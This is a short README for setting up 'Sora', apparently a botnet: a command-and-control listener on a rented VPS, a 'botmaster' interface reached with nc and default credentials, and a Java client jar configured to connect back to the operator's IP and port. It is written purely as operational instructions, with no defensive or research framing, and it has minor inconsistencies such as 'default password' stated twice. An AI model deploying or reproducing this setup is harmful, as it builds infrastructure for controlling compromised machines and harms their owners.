# Setting up the Sora listen server 

1. Buy a VPS 
2. `git clone https://github.com/thecarterb/SORA.git && cd SoraServer`
3. `gem install bundler && bundle install`

## Starting the _bot_ listener server
1. `./server <port>`

Be sure that `<port>` is the same port that you have configured the bots to connect back to.

## Connecting to the botmaster interface

Do `nc <your ip> 45678`, the default password is `botmaster` and the default password is `ilovedogs`. 
Be sure to change these.

***

# Configuring the client

1. Change `HttpRequest request = HttpRequest.get("http://192.168.153.34:8080");`
  * Change the `IP:port` to your server and listen port
2. Compile the jar by doing `./setup.sh <JAR name.jar>`
